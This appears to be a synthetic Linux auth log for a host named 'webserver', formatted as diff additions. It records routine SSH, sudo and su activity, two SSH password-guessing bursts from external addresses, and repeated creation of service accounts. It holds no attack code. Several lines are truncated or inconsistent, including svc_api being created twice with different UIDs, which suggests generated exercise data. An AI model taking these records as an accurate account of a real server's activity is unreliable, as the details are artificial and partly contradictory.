+Jun 13 06:51:52 webserver sudo[50010]:  admin_ops : TTY=pts/0 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/apt update
+Jun 13 07:16:48 webserver sshd[14905]: pam_unix(sshd:session): session closed for user admin_ops
+Jun 13 07:57:32 webserver sshd[62181]: Disconnected from authenticating user ubuntu 103.21.244.10 port 62573
+Jun 13 10:12:30 webserver sshd[48236]: pam_unix(sshd:session): session opened for user john by (uid=0)
+Jun 13 11:15:44 webserver pam_unix[36277]: Disconnected from authenticating user admin_ops 103.21.244.10 port 52222
+Jun 13 11:59:38 webserver sshd[27086]: Failed password for deploy from 103.21.244.10 port 59242 ssh2
+Jun 13 14:08:29 webserver sshd[34128]: Disconnected from authenticating user ubuntu 14.139.123.45 port 52550
+Jun 13 14:54:57 webserver sshd[20765]: pam_unix(sshd:session): session closed for user john
+Jun 13 15:53:15 webserver sshd[63439]: Disconnected from authenticating user deploy 49.36.78.145 port 63642
+Jun 13 17:10:05 webserver sshd[46016]: Accepted publickey for ubuntu from 122.161.45.67 port 43131 ssh2: RSA SHA256:b8b61d8601aff4df678e3396
+Jun 13 18:00:37 webserver sshd[19961]: Disconnected from authenticating user priya 49.36.78.145 port 49602
+Jun 13 18:10:46 webserver sshd[36651]: Accepted password for admin_ops from 103.21.244.10 port 61686 ssh2
+Jun 13 18:47:09 webserver sshd[15645]: pam_unix(sshd:session): session closed for user devops
+Jun 13 19:03:36 webserver sshd[32475]: Failed password for priya from 117.55.34.78 port 51841 ssh2
+Jun 13 19:23:46 webserver sshd[52679]: Failed password for priya from 117.55.34.78 port 45888 ssh2
+Jun 13 19:56:38 webserver sshd[42913]: Accepted publickey for priya from 122.161.45.67 port 47703 ssh2: RSA SHA256:83ab17294d6ce1b2da6c0d8c
+Jun 13 20:08:45 webserver sshd[18324]: Failed password for deploy from 117.55.34.78 port 44568 ssh2
+Jun 13 21:49:49 webserver pam_unix[12623]: pam_unix(sshd:session): session opened for user john by (uid=0)
+Jun 13 22:05:48 webserver sshd[41718]: Disconnected from authenticating user priya 103.21.244.10 port 42797
+Jun 13 23:39:25 webserver su[33882]: Successful su for root by john
+Jun 13 23:47:40 webserver sshd[59554]: Accepted publickey for admin_ops from 103.21.244.10 port 47580 ssh2: RSA SHA256:0cf55dae4c039f115ac75109
+Jun 13 23:49:39 webserver sshd[25823]: Failed password for ubuntu from 103.21.244.10 port 44835 ssh2
+Jun 14 04:14:38 webserver sshd[54936]: Accepted publickey for deploy from 115.240.89.12 port 62001 ssh2: RSA SHA256:eb29658a9a0b2e86a98a6008
+Jun 14 04:23:23 webserver sshd[48111]: Accepted password for ubuntu from 103.21.244.10 port 62156 ssh2
+Jun 14 04:28:38 webserver sshd[59307]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+Jun 14 05:42:56 webserver sshd[14630]: Disconnected from authenticating user john 115.240.89.12 port 58647
+Jun 14 06:00:00 webserver sshd[19420]: Failed password for
+Jun 14 07:05:01 webserver sudo[16971]:  john : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+Jun 14 07:12:48 webserver su[31757]: pam_unix(su:auth): authentication failure; logname=deploy uid=1000 euid=0 tty=pts/1 ruser=deploy rhost=  user=root
+Jun 14 07:15:15 webserver sshd[13057]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=115.240.89.12  user=deploy
+Jun 14 08:44:33 webserver sshd[52120]: pam_unix(sshd:session): session closed for user john
+Jun 14 09:00:18 webserver pam_unix[40981]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+Jun 14 09:06:15 webserver passwd[40337]: pam_unix(passwd:chauthtok): password changed for deploy
+Jun 14 09:48:55 webserver sshd[45096]: pam_unix(sshd:session): session closed for user admin_ops
+Jun 14 10:38:57 webserver sshd[58801]: pam_unix(sshd:session): session closed for user priya
+Jun 14 13:16:54 webserver sudo[51595]:  devops : TTY=pts/1 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/apt update
+Jun 14 15:15:27 webserver sshd[55564]: Failed password for devops from 115.240.89.12 port 51427 ssh2
+Jun 14 15:22:27 webserver pam_unix[20846]: Accepted password for admin_ops from 14.139.123.45 port 44711 ssh2
+Jun 14 17:23:41 webserver sshd[33101]: pam_unix(sshd:session): session closed for user priya
+Jun 14 18:57:09 webserver sshd[39681]: Accepted publickey for admin_ops from 103.21.244.10 port 41700 ssh2: RSA SHA256:c41b16a2a10688444272bbe4
+Jun 14 20:06:44 webserver sshd[42474]: pam_unix(sshd:session): session opened for user admin_ops by (uid=0)
+Jun 14 22:07:11 webserver passwd[62273]: pam_unix(passwd:chauthtok): password changed for john
+Jun 14 22:54:19 webserver pam_unix[41329]: Accepted publickey for admin_ops from 14.139.123.45 port 43125 ssh2: RSA SHA256:8c74aed4a5ff8f5e1916be91
+Jun 14 23:25:08 webserver sshd[35683]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=117.55.34.78  user=devops
+Jun 14 23:25:26 webserver sshd[19838]: Disconnected from authenticating user priya 103.21.244.10 port 55253
+Jun 15 01:47:28 webserver pam_unix[39950]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Jun 15 02:42:03 webserver pam_unix[33718]: Accepted publickey for john from 117.55.34.78 port 52582 ssh2: RSA SHA256:d58447c0a7eec900201a2aaf
+Jun 15 03:17:57 webserver sshd[46676]: pam_unix(sshd:session): session closed for user ubuntu
+Jun 15 03:29:58 webserver CRON[15782]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jun 15 03:48:47 webserver pam_unix[38733]: Accepted publickey for ubuntu from 103.21.244.10 port 44331 ssh2: RSA SHA256:8c4b36f3a60d0bfd9e74706e
+Jun 15 04:16:40 webserver sshd[57423]: Accepted publickey for deploy from 115.240.89.12 port 47706 ssh2: RSA SHA256:13d75c130231d0b348f86529
+Jun 15 04:50:07 webserver sshd[15735]: pam_unix(sshd:session): session closed for user admin_ops
+Jun 15 08:13:47 webserver sshd[55565]: pam_unix(sshd:session): session opened for user john by (uid=0)
+Jun 15 13:17:24 webserver sshd[47738]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Jun 15 14:36:34 webserver sshd[24289]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45  user=devops
+Jun 15 15:56:54 webserver useradd[43893]: new user: name=svc_cache, UID=1810, GID=1928, home=/home/svc_cache, shell=/bin/bash
+Jun 15 17:13:20 webserver pam_unix[64362]: Disconnected from authenticating user priya 115.240.89.12 port 42982
+Jun 15 18:09:16 webserver pam_unix[41851]: pam_unix(sshd:session): session closed for user deploy
+Jun 15 19:11:54 webserver sshd[22562]: Accepted password for deploy from 115.240.89.12 port 47392 ssh2
+Jun 15 19:28:45 webserver sudo[61045]: pam_unix(sudo:auth): authentication failure; logname=john uid=1000 euid=0 tty=pts/0 ruser=john rhost=  user=root
+Jun 15 20:14:53 webserver sshd[39724]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=deploy
+Jun 15 20:30:27 webserver sshd[12176]: Disconnected from authenticating user ubuntu 115.240.89.12 port 46254
+Jun 15 20:58:47 webserver sshd[62437]: Disconnected from authenticating user priya 103.21.244.10 port 47960
+Jun 15 21:21:25 webserver sshd[16238]: Accepted publickey for admin_ops from 14.139.123.45 port 61447 ssh2: RSA SHA256:0922594c351afb874cd78117
+Jun 15 23:14:21 webserver pam_unix[56197]: pam_unix(sshd:session): session opened for user john by (uid=0)
+Jun 15 23:28:35 webserver sshd[28264]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Jun 16 01:11:07 webserver su[63564]: Successful su for root by john
+Jun 16 01:58:29 webserver su[43657]: pam_unix(su:auth): authentication failure; logname=deploy uid=1000 euid=0 tty=pts/1 ruser=deploy rhost=  user=root
+Jun 16 03:02:40 webserver pam_unix[16441]: Accepted password for deploy from 115.240.89.12 port 54432 ssh2
+Jun 16 03:14:15 webserver sshd[13853]: Accepted password for devops from 49.36.78.145 port 40543 ssh2
+Jun 16 03:25:48 webserver CRON[58524]: pam_unix(cron:session): session closed for user root
+Jun 16 03:55:19 webserver sshd[24476]: Failed password for devops from 115.240.89.12 port 50997 ssh2
+Jun 16 04:35:09 webserver sudo[45481]:  john : TTY=pts/0 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+Jun 16 06:05:20 webserver sshd[19016]: Disconnected from authenticating user priya 49.36.78.145 port 48394
+Jun 16 08:34:56 webserver sshd[51701]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Jun 16 09:09:09 webserver sshd[47211]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145  user=deploy
+Jun 16 10:17:31 webserver sshd[59973]: Failed password for devops from 14.139.123.45 port 41406 ssh2
+Jun 16 10:57:02 webserver sshd[50565]: Accepted password for priya from 103.21.244.10 port 50158 ssh2
+Jun 16 11:13:12 webserver sshd[49234]: Disconnected from authenticating user devops 49.36.78.145 port 64055
+Jun 16 11:17:19 webserver sshd[56534]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=115.240.89.12  user=admin_ops
+Jun 16 11:34:18 webserver sshd[22278]: Accepted password for john from 122.161.45.67 port 44971 ssh2
+Jun 16 12:17:12 webserver sshd[36681]: pam_unix(sshd:session): session closed for user john
+Jun 16 18:14:58 webserver sshd[20030]: pam_unix(sshd:session): session closed for user admin_ops
+Jun 16 18:44:22 webserver useradd[31183]: new user: name=svc_api, UID=1606, GID=1557, home=/home/svc_api, shell=/bin/bash
+Jun 16 20:51:00 webserver sshd[44018]: pam_unix(sshd:session): session closed for user deploy
+Jun 16 23:22:14 webserver pam_unix[19473]: Accepted password for deploy from 49.36.78.145 port 53044 ssh2
+Jun 17 01:16:41 webserver pam_unix[59092]: Disconnected from authenticating user deploy 49.36.78.145 port 64078
+Jun 17 02:30:00 webserver sshd[35317]: Failed password for deploy from 185.220.101.34 port 59102 ssh2
+Jun 17 02:30:01 webserver sshd[39469]: Failed password for invalid user webmaster from 185.220.101.34 port 50216 ssh2
+Jun 17 02:30:01 webserver sshd[10707]: Failed password for deploy from 185.220.101.34 port 49849 ssh2
+Jun 17 02:30:04 webserver sshd[12637]: Failed password for invalid user postgres from 185.220.101.34 port 44923 ssh2
+Jun 17 02:30:06 webserver sshd[34905]: Failed password for root from 185.220.101.34 port 49171 ssh2
+Jun 17 02:30:07 webserver sshd[50110]: Failed password for devops from 185.220.101.34 port 53384 ssh2
+Jun 17 02:30:08 webserver sshd[39360]: Failed password for invalid user root from 185.220.101.34 port 64635 ssh2
+Jun 17 02:30:10 webserver sshd[31691]: Failed password for invalid user test from 185.220.101.34 port 49572 ssh2
+Jun 17 02:30:14 webserver sshd[61090]: Failed password for invalid user webmaster from 185.220.101.34 port 48416 ssh2
+Jun 17 02:30:15 webserver sshd[38784]: Failed password for ubuntu from 185.220.101.34 port 52918 ssh2
+Jun 17 02:30:16 webserver sshd[61850]: Failed password for invalid user jenkins from 185.220.101.34 port 50633 ssh2
+Jun 17 02:30:16 webserver sshd[34637]: Failed password for invalid user oracle from 185.220.101.34 port 48915 ssh2
+Jun 17 02:30:16 webserver sshd[27544]: Failed password for oracle from 185.220.101.34 port 45585 ssh2
+Jun 17 02:30:17 webserver sshd[55561]: Failed password for test from 185.220.101.34 port 59775 ssh2
+Jun 17 02:30:23 webserver sshd[25288]: Failed password for invalid user support from 185.220.101.34 port 54575 ssh2
+Jun 17 02:30:24 webserver sshd[37557]: Failed password for invalid user ubuntu2 from 185.220.101.34 port 51679 ssh2
+Jun 17 02:30:27 webserver sshd[63807]: Failed password for priya from 185.220.101.34 port 45828 ssh2
+Jun 17 02:30:29 webserver sshd[24162]: Failed password for ubuntu from 185.220.101.34 port 44416 ssh2
+Jun 17 02:30:33 webserver sshd[39162]: Failed password for invalid user ftpuser from 185.220.101.34 port 44177 ssh2
+Jun 17 02:30:33 webserver sshd[31760]: Failed password for invalid user www-data from 185.220.101.34 port 43833 ssh2
+Jun 17 02:30:40 webserver sshd[11342]: Failed password for devops from 185.220.101.34 port 48013 ssh2
+Jun 17 02:30:41 webserver sshd[52380]: Failed password for postgres from 185.220.101.34 port 64437 ssh2
+Jun 17 02:30:41 webserver sshd[30150]: Failed password for oracle from 185.220.101.34 port 56755 ssh2
+Jun 17 02:30:45 webserver sshd[11858]: Failed password for oracle from 185.220.101.34 port 62212 ssh2
+Jun 17 02:30:48 webserver sshd[55335]: Failed password for invalid user support from 185.220.101.34 port 62853 ssh2
+Jun 17 02:30:49 webserver sshd[14383]: Failed password for devops from 185.220.101.34 port 49776 ssh2
+Jun 17 02:30:49 webserver sshd[20574]: Failed password for invalid user admin from 185.220.101.34 port 61947 ssh2
+Jun 17 02:30:50 webserver sshd[56556]: Failed password for root from 185.220.101.34 port 58977 ssh2
+Jun 17 02:30:51 webserver sshd[33055]: Failed password for test from 185.220.101.34 port 49087 ssh2
+Jun 17 02:30:55 webserver sshd[36014]: Connection closed by invalid user priya 185.220.101.34 port 55847 [preauth]
+Jun 17 02:55:12 webserver sshd[62841]: pam_unix(sshd:session): session closed for user deploy
+Jun 17 04:39:55 webserver sudo[57394]:  devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Jun 17 05:34:52 webserver sshd[36633]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=117.55.34.78  user=deploy
+Jun 17 07:27:09 webserver sshd[15227]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=103.21.244.10  user=ubuntu
+Jun 17 08:23:07 webserver sshd[56083]: Disconnected from authenticating user admin_ops 115.240.89.12 port 43479
+Jun 17 09:54:06 webserver sshd[55397]: Accepted publickey for devops from 49.36.78.145 port 61914 ssh2: RSA SHA256:c825447aa5df3e69787d0736
+Jun 17 10:10:20 webserver sshd[61441]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145  user=priya
+Jun 17 10:26:09 webserver sshd[36419]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45  user=admin_ops
+Jun 17 11:17:27 webserver pam_unix[51420]: pam_unix(sshd:session): session closed for user devops
+Jun 17 11:47:48 webserver pam_unix[59065]: Accepted publickey for priya from 115.240.89.12 port 56983 ssh2: RSA SHA256:fdad612a480cf0f4282c494d
+Jun 17 11:55:54 webserver sshd[39935]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jun 17 13:20:13 webserver sshd[17882]: Failed password for priya from 49.36.78.145 port 48684 ssh2
+Jun 17 17:45:06 webserver sshd[33229]: Accepted publickey for admin_ops from 103.21.244.10 port 49976 ssh2: RSA SHA256:e027dc15cf0e4dc0739ee17e
+Jun 17 17:54:31 webserver sshd[25112]: pam_unix(sshd:session): session closed for user devops
+Jun 17 18:56:48 webserver sudo[25458]:  deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Jun 17 18:56:54 webserver sshd[40042]: pam_unix(sshd:session): session closed for user devops
+Jun 17 20:51:46 webserver CRON[28267]: pam_unix(cron:session): session closed for user root
+Jun 17 23:16:00 webserver sshd[57183]: pam_unix(sshd:session): session opened for user john by (uid=0)
+Jun 18 00:05:25 webserver sudo[35999]: pam_unix(sudo:auth): authentication failure; logname=admin_ops uid=1000 euid=0 tty=pts/0 ruser=admin_ops rhost=  user=root
+Jun 18 00:51:26 webserver sshd[51441]: pam_unix(sshd:session): session opened for user admin_ops by (uid=0)
+Jun 18 02:00:08 webserver sudo[52435]: pam_unix(sudo:auth): authentication failure; logname=priya uid=1000 euid=0 tty=pts/0 ruser=priya rhost=  user=root
+Jun 18 02:55:50 webserver sshd[17237]: Accepted password for john from 122.161.45.67 port 55442 ssh2
+Jun 18 04:25:56 webserver sudo[37746]:  john : TTY=pts/2 ; PWD=/etc/nginx ; USER=root ; COMMAND=/bin/chmod 600 /etc/ssl/private/server.key
+Jun 18 04:28:43 webserver passwd[20599]: pam_unix(passwd:chauthtok): password changed for deploy
+Jun 18 05:30:21 webserver sshd[57165]: Failed password for devops from 103.21.244.10 port 56147 ssh2
+Jun 18 07:34:24 webserver sshd[21759]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45  user=admin_ops
+Jun 18 08:09:30 webserver pam_unix[38296]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jun 18 10:05:44 webserver sudo[62725]:  admin_ops : TTY=pts/0 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/nginx.conf
+Jun 18 10:09:50 webserver sshd[30106]: Accepted password for deploy from 117.55.34.78 port 62550 ssh2
+Jun 18 10:40:32 webserver sudo[25972]:  admin_ops : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/pg_dump -U postgres mydb > /backups/mydb.sql
+Jun 18 10:59:23 webserver sshd[45028]: pam_unix(sshd:session): session opened for user john by (uid=0)
+Jun 18 11:36:59 webserver sshd[55302]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+Jun 18 12:42:18 webserver sudo[44237]: pam_unix(sudo:auth): authentication failure; logname=admin_ops uid=1000 euid=0 tty=pts/0 ruser=admin_ops rhost=  user=root
+Jun 18 13:13:55 webserver su[13454]: Successful su for root by deploy
+Jun 18 13:45:41 webserver sshd[29821]: pam_unix(sshd:session): session opened for user john by (uid=0)
+Jun 18 14:08:26 webserver sshd[63140]: Accepted password for deploy from 49.36.78.145 port 56235 ssh2
+Jun 18 15:00:19 webserver sshd[47786]: Disconnected from authenticating user deploy 14.139.123.45 port 53964
+Jun 18 16:15:19 webserver sshd[39004]: Disconnected from authenticating user devops 122.161.45.67 port 48942
+Jun 18 16:30:10 webserver sshd[23510]: Disconnected from authenticating user devops 103.21.244.10 port 40235
+Jun 18 17:10:18 webserver sshd[59221]: pam_unix(sshd:session): session closed for user ubuntu
+Jun 18 17:43:53 webserver sshd[19059]: Accepted password for priya from 14.139.123.45 port 47463 ssh2
+Jun 18 19:57:33 webserver sudo[14503]: pam_unix(sudo:auth): authentication failure; logname=admin_ops uid=1000 euid=0 tty=pts/0 ruser=admin_ops rhost=  user=root
+Jun 18 21:03:05 webserver sshd[39274]: Failed password for admin_ops from 115.240.89.12 port 52485 ssh2
+Jun 18 22:16:31 webserver sshd[21282]: Accepted password for deploy from 49.36.78.145 port 64134 ssh2
+Jun 18 23:05:49 webserver sshd[29607]: pam_unix(sshd:session): session closed for user ubuntu
+Jun 19 00:00:55 webserver sshd[53205]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Jun 19 02:47:05 webserver sshd[39147]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45  user=ubuntu
+Jun 19 05:03:40 webserver sshd[36107]: Failed password for invalid user git from 89.248.167.200 port 52320 ssh2
+Jun 19 05:03:42 webserver sshd[36107]: Connection closed by invalid user git 89.248.167.200 port 52320 [preauth]
+Jun 19 05:05:16 webserver sshd[24212]: Invalid user postgres from 89.248.167.200 port 51482
+Jun 19 05:05:18 webserver sshd[24212]: Connection closed by invalid user postgres 89.248.167.200 port 51482 [preauth]
+Jun 19 05:05:25 webserver sshd[32663]: Failed password for invalid user backup from 89.248.167.200 port 57797 ssh2
+Jun 19 05:05:26 webserver sshd[32663]: Connection closed by invalid user backup 89.248.167.200 port 57797 [preauth]
+Jun 19 05:09:15 webserver sshd[52397]: Failed password for invalid user root from 89.248.167.200 port 50213 ssh2
+Jun 19 05:09:18 webserver sshd[52397]: Connection closed by invalid user root 89.248.167.200 port 50213 [preauth]
+Jun 19 05:09:40 webserver sshd[29206]: Invalid user deploy2 from 89.248.167.200 port 43444
+Jun 19 05:09:42 webserver sshd[29206]: Connection closed by invalid user deploy2 89.248.167.200 port 43444 [preauth]
+Jun 19 05:13:37 webserver sshd[25820]: Failed password for invalid user mysql from 89.248.167.200 port 64195 ssh2
+Jun 19 05:13:38 webserver sshd[25820]: Connection closed by invalid user mysql 89.248.167.200 port 64195 [preauth]
+Jun 19 05:13:41 webserver sshd[12679]: Failed password for admin_ops from 103.21.244.10 port 54923 ssh2
+Jun 19 05:14:52 webserver sshd[64276]: Invalid user admin from 89.248.167.200 port 40223
+Jun 19 05:14:54 webserver sshd[64276]: Connection closed by invalid user admin 89.248.167.200 port 40223 [preauth]
+Jun 19 05:22:16 webserver sshd[28629]: Failed password for invalid user www-data from 89.248.167.200 port 49671 ssh2
+Jun 19 05:22:19 webserver sshd[28629]: Connection closed by invalid user www-data 89.248.167.200 port 49671 [preauth]
+Jun 19 05:25:29 webserver sshd[42776]: Invalid user test from 89.248.167.200 port 47854
+Jun 19 05:25:32 webserver sshd[42776]: Connection closed by invalid user test 89.248.167.200 port 47854 [preauth]
+Jun 19 05:26:12 webserver sshd[32537]: Invalid user ubuntu2 from 89.248.167.200 port 52144
+Jun 19 05:26:13 webserver sshd[32537]: Connection closed by invalid user ubuntu2 89.248.167.200 port 52144 [preauth]
+Jun 19 05:26:32 webserver sshd[42304]: Invalid user guest from 89.248.167.200 port 44175
+Jun 19 05:26:34 webserver sshd[42304]: Connection closed by invalid user guest 89.248.167.200 port 44175 [preauth]
+Jun 19 05:31:03 webserver sshd[42636]: Invalid user ftpuser from 89.248.167.200 port 40949
+Jun 19 05:31:04 webserver sshd[42636]: Connection closed by invalid user ftpuser 89.248.167.200 port 40949 [preauth]
+Jun 19 05:31:41 webserver sshd[27407]: Failed password for invalid user nagios from 89.248.167.200 port 52431 ssh2
+Jun 19 05:31:43 webserver sshd[27407]: Connection closed by invalid user nagios 89.248.167.200 port 52431 [preauth]
+Jun 19 05:32:26 webserver sshd[51274]: Invalid user oracle from 89.248.167.200 port 44915
+Jun 19 05:32:28 webserver sshd[51274]: Connection closed by invalid user oracle 89.248.167.200 port 44915 [preauth]
+Jun 19 05:34:38 webserver sshd[23771]: Failed password for invalid user webmaster from 89.248.167.200 port 40040 ssh2
+Jun 19 05:34:39 webserver sshd[23771]: Connection closed by invalid user webmaster 89.248.167.200 port 40040 [preauth]
+Jun 19 05:36:19 webserver sshd[23586]: Invalid user jenkins from 89.248.167.200 port 61499
+Jun 19 05:36:20 webserver sshd[23586]: Connection closed by invalid user jenkins 89.248.167.200 port 61499 [preauth]
+Jun 19 05:36:46 webserver sshd[31153]: Invalid user user from 89.248.167.200 port 44828
+Jun 19 05:36:49 webserver sshd[31153]: Connection closed by invalid user user 89.248.167.200 port 44828 [preauth]
+Jun 19 05:37:53 webserver sshd[30660]: Failed password for invalid user pi from 89.248.167.200 port 45527 ssh2
+Jun 19 05:37:54 webserver sshd[30660]: Connection closed by invalid user pi 89.248.167.200 port 45527 [preauth]
+Jun 19 05:38:12 webserver sshd[15104]: Invalid user support from 89.248.167.200 port 55292
+Jun 19 05:38:13 webserver sshd[15104]: Connection closed by invalid user support 89.248.167.200 port 55292 [preauth]
+Jun 19 05:57:47 webserver passwd[35289]: pam_unix(passwd:chauthtok): password changed for priya
+Jun 19 06:40:08 webserver su[10558]: pam_unix(su:auth): authentication failure; logname=deploy uid=1000 euid=0 tty=pts/1 ruser=deploy rhost=  user=root
+Jun 19 06:56:29 webserver sshd[58843]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+Jun 19 07:24:22 webserver sshd[59566]: Disconnected from authenticating user john 103.21.244.10 port 55765
+Jun 19 07:37:36 webserver sshd[54970]: Accepted publickey for devops from 115.240.89.12 port 44379 ssh2: RSA SHA256:1c71d60f42da5b6866f42e11
+Jun 19 07:39:46 webserver sshd[58799]: Accepted password for admin_ops from 14.139.123.45 port 63267 ssh2
+Jun 19 08:08:07 webserver sudo[11333]:  deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Jun 19 08:16:29 webserver sshd[37865]: Disconnected from authenticating user admin_ops 14.139.123.45 port 58651
+Jun 19 10:11:11 webserver sshd[37584]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=103.21.244.10  user=priya
+Jun 19 12:59:47 webserver sudo[60229]:  devops : TTY=pts/1 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+Jun 19 13:42:12 webserver sudo[45015]:  admin_ops : TTY=pts/2 ; PWD=/home/admin_ops ; USER=root ; COMMAND=/usr/bin/systemctl restart postgresql
+Jun 19 14:15:47 webserver sshd[18556]: pam_unix(sshd:session): session closed for user deploy
+Jun 19 16:58:00 webserver pam_unix[29205]: pam_unix(sshd:session): session opened for user admin_ops by (uid=0)
+Jun 19 18:47:19 webserver sshd[57587]: Disconnected from authenticating user john 122.161.45.67 port 58291
+Jun 19 19:18:25 webserver sshd[14988]: Accepted publickey for admin_ops from 117.55.34.78 port 61351 ssh2: RSA SHA256:5508d2a0fa0738bab389834d
+Jun 19 20:18:33 webserver sshd[29809]: Disconnected from authenticating user admin_ops 103.21.244.10 port 62688
+Jun 19 20:29:19 webserver sshd[39254]: pam_unix(sshd:session): session closed for user ubuntu
+Jun 19 21:47:21 webserver sudo[50794]:  priya : TTY=pts/2 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Jun 19 22:46:11 webserver sshd[25477]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=115.240.89.12  user=john
+Jun 19 23:34:29 webserver sudo[47306]:  devops : TTY=pts/2 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/systemctl restart postgresql
+Jun 20 01:28:37 webserver pam_unix[17022]: pam_unix(sshd:session): session closed for user ubuntu
+Jun 20 01:59:40 webserver sshd[19533]: pam_unix(sshd:session): session closed for user priya
+Jun 20 02:17:46 webserver sshd[56090]: Failed password for ubuntu from 117.55.34.78 port 41676 ssh2
+Jun 20 02:25:50 webserver sshd[19470]: Failed password for ubuntu from 117.55.34.78 port 50668 ssh2
+Jun 20 03:03:21 webserver sudo[32168]:  deploy : TTY=pts/0 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Jun 20 04:21:30 webserver sshd[63237]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jun 20 04:27:24 webserver pam_unix[12490]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jun 20 04:34:07 webserver sshd[56154]: pam_unix(sshd:session): session closed for user john
+Jun 20 06:24:42 webserver sudo[19041]:  devops : TTY=pts/0 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/nginx.conf
+Jun 20 06:36:43 webserver sshd[30262]: Accepted password for admin_ops from 122.161.45.67 port 61585 ssh2
+Jun 20 08:44:51 webserver pam_unix[42006]: Accepted publickey for priya from 115.240.89.12 port 62243 ssh2: RSA SHA256:5d5528589ee48b4fc825dce2
+Jun 20 09:27:20 webserver sshd[12486]: Failed password for ubuntu from 115.240.89.12 port 43564 ssh2
+Jun 20 09:57:42 webserver sudo[59374]:  admin_ops : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/docker ps
+Jun 20 11:15:58 webserver passwd[17343]: pam_unix(passwd:chauthtok): password changed for admin_ops
+Jun 20 11:17:37 webserver sshd[64818]: Accepted password for ubuntu from 103.21.244.10 port 64880 ssh2
+Jun 20 12:00:00 webserver sudo[13149]: pam_unix
+Jun 20 13:03:55 webserver sshd[15012]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Jun 20 13:43:06 webserver sshd[17183]: Accepted publickey for devops from 49.36.78.145 port 44517 ssh2: RSA SHA256:eb162fdee20c572f52fc1ae0
+Jun 20 15:36:15 webserver sudo[19358]:  devops : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+Jun 20 16:03:23 webserver sshd[37247]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=103.21.244.10  user=john
+Jun 20 17:28:29 webserver sudo[48852]:  devops : TTY=pts/0 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Jun 20 18:23:24 webserver pam_unix[45664]: pam_unix(sshd:session): session closed for user deploy
+Jun 20 18:27:55 webserver pam_unix[54241]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jun 20 19:12:04 webserver sshd[58375]: Accepted publickey for john from 49.36.78.145 port 53193 ssh2: RSA SHA256:801fbdc46687c9cdbb516362
+Jun 20 19:45:16 webserver sshd[36749]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=115.240.89.12  user=priya
+Jun 20 21:19:33 webserver sshd[49203]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=priya
+Jun 20 22:13:45 webserver sudo[34311]:  ubuntu : TTY=pts/1 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+Jun 20 23:30:07 webserver sshd[20804]: Accepted publickey for admin_ops from 117.55.34.78 port 63569 ssh2: RSA SHA256:019e28d467d0648fa67329cb
+Jun 21 00:19:55 webserver useradd[26901]: new user: name=svc_api, UID=1515, GID=1464, home=/home/svc_api, shell=/bin/bash
+Jun 21 00:57:48 webserver sshd[51430]: Accepted password for admin_ops from 122.161.45.67 port 49719 ssh2
